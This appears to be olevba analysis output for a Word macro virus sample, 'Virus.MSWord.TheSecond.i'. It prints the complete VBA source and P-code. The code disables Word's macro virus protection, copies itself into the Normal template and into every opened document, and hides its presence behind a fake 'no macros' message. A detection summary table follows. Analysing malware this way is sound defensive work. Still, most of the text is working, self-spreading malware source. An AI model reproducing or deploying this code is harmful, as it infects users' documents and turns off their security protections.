olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.TheSecond.i - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íþáèí"
    .Replacement.Text = "Íóäèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íóäèí"
    .Replacement.Text = "Íþáèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/TheSecond - 3620 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitStr 0x0010 "The Second, 2000"
' 	St Copyrights 
' Line #2:
' 	LitStr 0x0008 "Revenger"
' 	St NickName 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #5:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #6:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000E "\TheSecond.tmp"
' 	Add 
' 	St x 
' Line #9:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #10:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitVarSpecial (False)
' 	St flag 
' Line #14:
' 	LitVarSpecial (False)
' 	St infected 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #17:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #20:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #22:
' 	LitVarSpecial (True)
' 	St infected 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #28:
' 	End 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub FilePrint())
' Line #31:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #32:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #33:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #34:
' 	LitStr 0x0005 "Íþáèí"
' 	MemStWith Then 
' Line #35:
' 	LitStr 0x0005 "Íóäèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #36:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #37:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #42:
' 	EndWith 
' Line #43:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #44:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #45:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #46:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #47:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #48:
' 	LitStr 0x0005 "Íóäèí"
' 	MemStWith Then 
' Line #49:
' 	LitStr 0x0005 "Íþáèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #50:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #51:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #52:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #53:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #54:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #55:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #56:
' 	EndWith 
' Line #57:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub ToolsMacro())
' Line #60:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub ViewVBCode())
' Line #63:
' 	LitStr 0x0019 "Íåò çàãðóæåííûõ ìàêðîñîâ!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #64:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

